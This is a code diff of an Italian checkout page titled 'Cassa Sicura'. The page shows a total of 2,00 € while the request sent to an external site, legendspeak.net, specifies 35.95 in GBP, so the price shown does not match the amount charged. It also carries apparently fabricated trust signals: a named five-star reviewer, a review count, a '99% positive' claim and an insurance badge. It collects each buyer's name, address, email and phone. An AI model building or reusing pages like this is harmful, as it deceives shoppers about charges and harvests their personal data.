@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-<title>Pagamento Sicuro</title>
+<title>Cassa Sicura</title>
 
 <meta http-equiv="Content-Security-Policy" content="
 default-src 'self' https: data: blob: 'unsafe-inline' 'unsafe-eval';
@@ -94,13 +94,13 @@ animation:loadingBar 2.2s ease-in-out infinite}
 sessionStorage.setItem("orig_qs", location.search.replace(/^\?/, ""));
 </script>
 
-<div class="safe">Connessione SSL Sicura</div>
+<div class="safe">Connessione SSL sicura alla cassa</div>
 
 <div class="wrap">
 
 <div class="page-title">
-Pagamento Sicuro 🔒 <span class="stars">★★★★★</span>
-<span class="reviews">(2.777 recensioni dei clienti)</span>
+Cassa Sicura 🔒 <span class="stars">★★★★★</span>
+<span class="reviews">(2.777 recensioni clienti)</span>
 </div>
 
 <div class="grid">
@@ -125,13 +125,13 @@ Pagamento Sicuro 🔒 <span class="stars">★★★★★</span>
 </div>
 
 <div class="form-grid">
-<input id="billingStreet" class="input" placeholder="Indirizzo (Via e Numero Civico)" style="grid-column:1/-1" required>
+<input id="billingStreet" class="input" placeholder="Indirizzo (Via e numero civico)" style="grid-column:1/-1" required>
 <input id="billingPostcode" class="input" placeholder="Codice Postale (CAP)" required>
 <input id="billingCity" class="input" placeholder="Città / Località" required>
 </div>
 
 <div class="form-grid">
-<input id="emailInput" class="input" type="email" placeholder="Indirizzo Email" required>
+<input id="emailInput" class="input" type="email" placeholder="Indirizzo E-mail" required>
 <input class="input" value="Italia" disabled>
 </div>
 
@@ -139,7 +139,7 @@ Pagamento Sicuro 🔒 <span class="stars">★★★★★</span>
 <select id="phonePrefix" class="select">
 <option value="+39">+39 — Italia</option>
 </select>
-<input id="phoneNumber" class="input" placeholder="Numero di Telefono" required>
+<input id="phoneNumber" class="input" placeholder="Numero di telefono" required>
 </div>
 
 <input id="nameInput" type="hidden">
@@ -154,7 +154,7 @@ Pagamento Sicuro 🔒 <span class="stars">★★★★★</span>
 <aside>
 
 <div class="widget">
-<div style="text-align:center;font-weight:800">Recensioni dei Clienti</div>
+<div style="text-align:center;font-weight:800">Recensioni dei clienti</div>
 <div style="text-align:center;font-weight:700;">Fenella Lara</div>
 <div style="text-align:center;color:#f6b80c;">★★★★★</div>
 <p style="text-align:center">Ho ricevuto il mio prodotto ieri. Esperienza eccellente!</p>
@@ -170,16 +170,16 @@ Pagamento Sicuro 🔒 <span class="stars">★★★★★</span>
 <div style="margin-left:auto;font-weight:800">Gratis</div>
 </div>
 
-<div style="margin-top:14px;font-weight:800">Riepilogo Ordine</div>
-<div class="order-row"><span>Totale</span><span>49,95 €</span></div>
+<div style="margin-top:14px;font-weight:800">Riepilogo ordine</div>
+<div class="order-row"><span>Totale</span><span>2,00 €</span></div>
 </div>
 
 <div class="widget">
-<div style="font-weight:800;margin-bottom:10px">Perché Fidarsi di Noi</div>
+<div style="font-weight:800;margin-bottom:10px">Perché fidarsi di noi</div>
 <div class="trust">
 <div class="box"><div>⭐</div><div>99% recensioni positive</div></div>
 <div class="box"><div>🔒</div><div>Sicurezza SSL</div></div>
-<div class="box"><div>🛡️</div><div>Assicurazione di $250.000</div></div>
+<div class="box"><div>🛡️</div><div>Assicurazione di 250.000 $</div></div>
 </div>
 </div>
 
@@ -273,7 +273,7 @@ nextBtn.onclick = async () => {
 
   try {
     nextBtn.disabled = true;
-    nextBtn.textContent = "Creazione cassa sicura…";
+    nextBtn.textContent = "Creazione cassa sicura in corso…";
     overlay.setAttribute("aria-hidden", "false");
 
     const response = await fetch("https://www.legendspeak.net/api/create-promo-checkout-link", {
@@ -282,10 +282,10 @@ nextBtn.onclick = async () => {
         "Content-Type": "application/json"
       },
       body: JSON.stringify({
-        plan: "4995", 
+        plan: "3595", 
         step2File: "fi-it2.html",
         currency: "GBP",
-        amount: 49.95,
+        amount: 35.95, 
         sourcePage: window.location.href,
 
         firstName: firstName.value.trim(),
@@ -309,7 +309,7 @@ nextBtn.onclick = async () => {
     const data = await response.json();
 
     if (!response.ok || !data.url) {
-      throw new Error(data.error || "Impossibile creare il link di pagamento sicuro.");
+      throw new Error(data.error || "Impossibile creare una cassa sicura.");
     }
 
     window.location.href =
@@ -323,7 +323,7 @@ nextBtn.onclick = async () => {
     overlay.setAttribute("aria-hidden", "true");
     nextBtn.disabled = false;
     nextBtn.textContent = "Continua";
-    alert(error.message || "Impossibile aprire il pagamento sicuro. Si prega di riprovare.");
+    alert(error.message || "Impossibile aprire la cassa sicura. Si prega di riprovare.");
   }
 };
 
